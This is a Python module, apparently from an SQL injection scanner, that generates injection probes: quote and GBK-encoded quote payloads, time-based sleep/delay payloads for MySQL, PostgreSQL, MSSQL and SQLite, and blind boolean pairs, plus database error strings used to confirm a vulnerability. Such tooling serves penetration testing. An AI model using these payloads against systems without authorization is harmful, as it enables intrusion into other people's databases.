import string
import random

vulncheck = []
scantype = "full"
BannedURLs = []

SQLQuotes = [
    "'",
    '"'
]

GBKQuotes = [
    "%bf'",
    '%bf"'
]

SQLComments = [
    "--",
    "-- -",
    "#",
    ";"
]

TimeBase = [
    "SELECT SLEEP(2)",          # MySQL
    "SELECT PG_SLEEP(2)",       # PostGreSQL
    "WAITFOR DELAY '00:00:01'", # MSSQL
    "sqlite3_sleep(2000)"       # SQLite3
]

BlindTrue = [
    "AND 1=1",
]

BlindFalse = [
    "AND 1=2"
]

def RandChar(size = 6, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def RandCharTest(size = 6):
    result = []
    rand = RandChar(size)
    for quote in SQLQuotes:
        result.append(rand + " " + quote)
    return result

def AllAlpha():
    result = {"a '"}
    for letter in string.ascii_letters.lower():
        for quote in SQLQuotes:
            result.update({letter + " " + quote})
    return result

def PayloadsTimeBase():
    result = []
    for payload in TimeBase:
        for comment in SQLComments:
            result.append(";" + payload + comment)
    return result

def PayloadsBlind():
    result = []
    btrue = []
    bfalse = []
    SQLCommentsModif = SQLComments
    SQLCommentsModif.append("")
    for payload in BlindTrue:
        for comment in SQLCommentsModif:
            btrue.append(" " + payload + comment)
    for payload in BlindFalse:
        for comment in SQLCommentsModif:
            bfalse.append(" " + payload + comment)
    
    if len(btrue) > len(bfalse):
        for i in range(0, len(bfalse)):
            result.append(btrue[i])
            result.append(bfalse[i])
    else:
        for i in range(0, len(btrue)):
            result.append([btrue[i], bfalse[i]])
    return result

vulnproof = [
    # ======== SQLite3 ========
    "<b>Warning</b>:  SQLite3",
    "unrecognized token:",
    "Unable to prepare statement:",
    # ======== MySQL =========
    "You have an error in your SQL",
    "MySQL server version for the right syntax",
    "supplied argument is not a valid MySQL result resource",
    # ======== PostgreSQL ========
    "ERROR:  syntax error"
]

Fullvulncheck = [
    [SQLQuotes, "quotes"],
    [PayloadsBlind(), "blind"],
    [PayloadsTimeBase(), "timebase"],
    [GBKQuotes, "gbkquotes"],
    [AllAlpha(), "allalpha"]
]

Quickvulncheck = [
    [SQLQuotes, "quotes"],
]

def init():
    global vulncheck
    global scantype

    if scantype == "quick":
        vulncheck = Quickvulncheck
        return True
    elif scantype == "full":
        vulncheck = Fullvulncheck
        return True
    else:
        return False